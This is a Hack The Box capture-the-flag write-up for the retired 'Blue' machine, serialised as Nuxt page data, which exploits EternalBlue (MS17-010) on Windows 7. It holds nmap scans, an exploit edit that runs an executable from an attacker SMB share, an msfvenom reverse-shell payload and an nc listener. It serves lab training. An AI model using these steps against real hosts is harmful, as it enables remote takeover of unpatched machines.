__NUXT_JSONP__("/writeups/blue-htb", (function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V){return {data:[{article:{slug:"blue-htb",description:"HTB Easy Machine",title:"Blue",img:"\u002Fimages\u002Fwriteups\u002Fblue\u002Fblue.png",tags:["easy","windows",F,"msfvenom","smb","eternalblue"],toc:[{id:G,depth:x,text:H},{id:I,depth:x,text:J},{id:K,depth:x,text:L}],body:{type:"root",children:[{type:b,tag:"h1",props:{id:"blue-easy-windows"},children:[{type:b,tag:o,props:{href:"#blue-easy-windows",ariaHidden:r,tabIndex:s},children:[{type:b,tag:e,props:{className:[t,u]},children:[]}]},{type:a,value:"Blue #Easy #Windows"}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"#technique-smbserver #nmap #msfvenom #eternalblue #smb"}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:b,tag:p,props:{},children:[{type:a,value:"IP"}]},{type:a,value:": 10.10.10.40"}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:b,tag:p,props:{},children:[{type:a,value:"Start date"}]},{type:a,value:": [[2022-04-05]]\n"},{type:b,tag:p,props:{},children:[{type:a,value:"Finish date"}]},{type:a,value:": [[2022-04-05]]"}]},{type:a,value:c},{type:b,tag:y,props:{id:G},children:[{type:b,tag:o,props:{href:"#10-enumeration---nmap",ariaHidden:r,tabIndex:s},children:[{type:b,tag:e,props:{className:[t,u]},children:[]}]},{type:a,value:H}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"First of all we scan all the ports open using "},{type:b,tag:d,props:{},children:[{type:a,value:F}]},{type:a,value:z}]},{type:a,value:c},{type:b,tag:"ul",props:{},children:[{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"-T5"}]},{type:a,value:": to send as many packets as possible. We don't care about stealth."}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"-p-"}]},{type:a,value:": to scan all the ports ( 65535)"}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"n"}]},{type:a,value:": to not apply DNS resolution."}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"-Pn"}]},{type:a,value:": to not send a ping on each port."}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"-vvv"}]},{type:a,value:": to output information while scanning"}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"--min-rate 5000"}]},{type:a,value:": to send no less than 5000 packets per second."}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"-oN"}]},{type:a,value:": to save in NMAP format."}]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,v]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `nmap -T5 -p- -n -Pn -vvv --min-rate 5000 10.10.10.40 -oN blue.nmap`\n\n\n~~~python\nPORT      STATE SERVICE      REASON\n135\u002Ftcp   open  msrpc        syn-ack\n139\u002Ftcp   open  netbios-ssn  syn-ack\n445\u002Ftcp   open  microsoft-ds syn-ack\n49152\u002Ftcp open  unknown      syn-ack\n49153\u002Ftcp open  unknown      syn-ack\n49154\u002Ftcp open  unknown      syn-ack\n49155\u002Ftcp open  unknown      syn-ack\n49156\u002Ftcp open  unknown      syn-ack\n49157\u002Ftcp open  unknown      syn-ack\n\n"}]}]}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"Now we run a port scan"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,v]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `nmap --min-rate 5000 -n -Pn -sCV -p139,445 10.10.10.40`\n\n\n~~~python\n\nPORT    STATE SERVICE      VERSION\n139\u002Ftcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445\u002Ftcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:\u002Fo:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2022-04-05T15:00:12\n|_  start_date: 2022-04-05T14:48:19\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.1: \n|_    Message signing enabled but not required\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:\u002Fo:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2022-04-05T16:00:14+01:00\n|_clock-skew: mean: -17m45s, deviation: 34m36s, median: 2m12s\n\n"}]}]}]},{type:a,value:c},{type:b,tag:y,props:{id:I},children:[{type:b,tag:o,props:{href:"#11-enumeration---port-139445",ariaHidden:r,tabIndex:s},children:[{type:b,tag:e,props:{className:[t,u]},children:[]}]},{type:a,value:J}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"As we can see there is an smb server running."}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"Let's run some smb scans:"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,v]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `nmap --script \"smb-enum*\" 10.10.10.40 -oN blue-smbenum.nmap`\n\n**Enumerating** the smb shares using `nmap` scripts.\n\n~~~python\n\nPORT    STATE SERVICE      VERSION\n139\u002Ftcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445\u002Ftcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:\u002Fo:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2022-04-05T15:00:12\n|_  start_date: 2022-04-05T14:48:19\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.1: \n|_    Message signing enabled but not required\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:\u002Fo:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2022-04-05T16:00:14+01:00\n|_clock-skew: mean: -17m45s, deviation: 34m36s, median: 2m12s\n\n"}]}]}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,v]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `nmap --script \"smb-vuln*\" 10.10.10.40 -oN blue-smbvuln.nmap`\n\nScanning smb for **vulnerabilities** using `nmap`.\n\nIt seems it is vulnerable to **ms17-010**.  \n\n~~~python\n\nHost script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|\n|     Disclosure date: 2017-03-14\n|     References:\n|       https:\u002F\u002Fcve.mitre.org\u002Fcgi-bin\u002Fcvename.cgi?name=CVE-2017-0143\n|       https:\u002F\u002Fblogs.technet.microsoft.com\u002Fmsrc\u002F2017\u002F05\u002F12\u002Fcustomer-guidance-for-wannacrypt-attacks\u002F\n|_      https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fsecurity\u002Fms17-010.aspx\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n\n"}]}]}]},{type:a,value:c},{type:b,tag:y,props:{id:K},children:[{type:b,tag:o,props:{href:"#20-exploitation-ms17-010---nt-authority",ariaHidden:r,tabIndex:s},children:[{type:b,tag:e,props:{className:[t,u]},children:[]}]},{type:a,value:L}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"Knowing the machine is vulnerable to MS17-10 we can start looking for exploits."}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,M]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"searchsploit ms17-010\n"}]}]}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"From this result it seems that this machine is vulnerable to "},{type:b,tag:p,props:{},children:[{type:a,value:"Eternal Blue"}]}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,"language-python"]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"Microsoft Windows "},{type:b,tag:e,props:{className:[g,m]},children:[{type:a,value:N}]},{type:a,value:A},{type:b,tag:e,props:{className:[g,B]},children:[{type:a,value:"'EternalRomance'"}]},{type:b,tag:e,props:{className:[g,m]},children:[{type:a,value:w}]},{type:b,tag:e,props:{className:[g,B]},children:[{type:a,value:"'EternalSynergy'"}]},{type:b,tag:e,props:{className:[g,m]},children:[{type:a,value:w}]},{type:b,tag:e,props:{className:[g,B]},children:[{type:a,value:"'EternalChampion'"}]},{type:a,value:" SMB Remote Code Execution "},{type:b,tag:e,props:{className:[g,q]},children:[{type:a,value:O}]},{type:a,value:"Metasploit"},{type:b,tag:e,props:{className:[g,q]},children:[{type:a,value:P}]},{type:a,value:A},{type:b,tag:e,props:{className:[g,q]},children:[{type:a,value:O}]},{type:a,value:"MS17"},{type:b,tag:e,props:{className:[g,m]},children:[{type:a,value:N}]},{type:b,tag:e,props:{className:[g,Q]},children:[{type:a,value:"010"}]},{type:b,tag:e,props:{className:[g,q]},children:[{type:a,value:P}]},{type:a,value:A},{type:b,tag:e,props:{className:[g,m]},children:[{type:a,value:"|"}]},{type:a,value:" windows"},{type:b,tag:e,props:{className:[g,m]},children:[{type:a,value:w}]},{type:a,value:"remote"},{type:b,tag:e,props:{className:[g,m]},children:[{type:a,value:w}]},{type:b,tag:e,props:{className:[g,Q]},children:[{type:a,value:"43970"}]},{type:b,tag:e,props:{className:[g,q]},children:[{type:a,value:z}]},{type:a,value:"rb\n\n"}]}]}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"There is a github repository that contains tools to exploit Eternal blue in various Windows versions."}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"This machine is "},{type:b,tag:d,props:{},children:[{type:a,value:"Windows 7 Professional"}]}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:b,tag:o,props:{href:"https:\u002F\u002Fgithub.com\u002Fworawit\u002FMS17-010",rel:["nofollow","noopener","noreferrer"],target:"_blank"},children:[{type:a,value:"Github Repository - MS17-010"}]}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"To ease the machine we can exploit it using "},{type:b,tag:d,props:{},children:[{type:a,value:"42315"}]},{type:a,value:" from "},{type:b,tag:d,props:{},children:[{type:a,value:"searchsploit"}]}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,M]},children:[{type:b,tag:d,props:{},children:[{type:b,tag:e,props:{className:[g,C]},children:[{type:b,tag:e,props:{className:[g,C]},children:[{type:a,value:R}]},{type:a,value:"searchsploit ms17-010"},{type:b,tag:e,props:{className:[g,C]},children:[{type:a,value:R}]}]},{type:a,value:"\n\n"},{type:b,tag:e,props:{className:[g,"comment"]},children:[{type:a,value:"# **Microsoft Windows 7\u002F2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)**"}]},{type:a,value:c}]}]}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:b,tag:S,props:{alt:"Searchsploit Output",src:"\u002Fimages\u002Fwriteups\u002Fblue\u002Fsearchsploit.png"},children:[]}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:b,tag:p,props:{},children:[{type:a,value:"Steps"}]},{type:a,value:" to exploit the machine:"}]},{type:a,value:c},{type:b,tag:n,props:{},children:[{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Download "},{type:b,tag:d,props:{},children:[{type:a,value:D}]},{type:a,value:" and "},{type:b,tag:d,props:{},children:[{type:a,value:T}]},{type:a,value:U},{type:b,tag:n,props:{},children:[{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:D}]},{type:a,value:V},{type:b,tag:d,props:{},children:[{type:a,value:"searchsploit -p 42315.py"}]},{type:a,value:" to copy path."}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:T}]},{type:a,value:V},{type:b,tag:d,props:{},children:[{type:a,value:"curl https:\u002F\u002Fgithub.com\u002Fworawit\u002FMS17-010\u002Fblob\u002Fmaster\u002Fmysmb.py -o mysmb.py"}]}]},{type:a,value:c}]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Create a python venv "},{type:b,tag:d,props:{},children:[{type:a,value:"virtualenv -p python2 venv"}]},{type:a,value:U},{type:b,tag:n,props:{},children:[{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Activate python venv "},{type:b,tag:d,props:{},children:[{type:a,value:"source venv\u002Fbin\u002Factivate"}]}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Install "},{type:b,tag:d,props:{},children:[{type:a,value:"impacket"}]},{type:a,value:": "},{type:b,tag:d,props:{},children:[{type:a,value:"pip install impacket"}]}]},{type:a,value:c}]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Modify "},{type:b,tag:d,props:{},children:[{type:a,value:D}]},{type:a,value:c},{type:b,tag:n,props:{},children:[{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Line 36: "},{type:b,tag:d,props:{},children:[{type:a,value:"USERNAME = 'guest'"}]}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Lines 916-920: Comment them using "},{type:b,tag:d,props:{},children:[{type:a,value:"#"}]}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Uncommnent and change line 923 by : "},{type:b,tag:d,props:{},children:[{type:a,value:"service_exec(conn, r'cmd \u002Fc \\\\10.10.14.14\\folder\\faye.exe')"}]},{type:a,value:c},{type:b,tag:n,props:{},children:[{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"This would require an SMB server running and a reverse shell inside called "},{type:b,tag:d,props:{},children:[{type:a,value:E}]}]},{type:a,value:c}]},{type:a,value:c}]},{type:a,value:c}]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Create reverse shell "},{type:b,tag:d,props:{},children:[{type:a,value:E}]},{type:a,value:c},{type:b,tag:n,props:{},children:[{type:a,value:c},{type:b,tag:f,props:{},children:[{type:b,tag:d,props:{},children:[{type:a,value:"msfvenom -p windows\u002Fshell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o faye.exe"}]}]},{type:a,value:c}]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Start smbserver with "},{type:b,tag:d,props:{},children:[{type:a,value:"impacket-smbserver folder ."}]},{type:a,value:" (where "},{type:b,tag:d,props:{},children:[{type:a,value:E}]},{type:a,value:" is at)"}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Listen in port 443 "},{type:b,tag:d,props:{},children:[{type:a,value:"rlwrap -cAr nc -lvnp 443"}]}]},{type:a,value:c},{type:b,tag:f,props:{},children:[{type:a,value:"Exploit it using "},{type:b,tag:d,props:{},children:[{type:a,value:"python 42315.py 10.10.10.40"}]}]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:a,value:"And voila! We have a reverse shell as "},{type:b,tag:d,props:{},children:[{type:a,value:"nt authority"}]},{type:a,value:z}]},{type:a,value:c},{type:b,tag:h,props:{},children:[{type:b,tag:S,props:{alt:"Admin Shell",src:"\u002Fimages\u002Fwriteups\u002Fblue\u002Fshell.png"},children:[]}]}]},dir:"\u002Fwriteups",path:"\u002Fwriteups\u002Fblue-htb",extension:".md",createdAt:"2022-07-08T13:15:28.303Z",updatedAt:"2022-07-24T22:02:16.662Z"}}],fetch:{},mutations:void 0}}("text","element","\n","code","span","li","token","p","div","nuxt-content-highlight","pre","line-numbers","operator","ol","a","strong","punctuation","true",-1,"icon","icon-link","language-text","\u002F",3,"h3","."," ","string","variable","42315.py","faye.exe","nmap","10-enumeration---nmap","1.0 Enumeration - Nmap","11-enumeration---port-139445","1.1 Enumeration - Port 139,445","20-exploitation-ms17-010---nt-authority","2.0 Exploitation MS17-010 -\u003E nt authority","language-bash","-","(",")","number","`","img","mysmb.py",".\n"," using ")));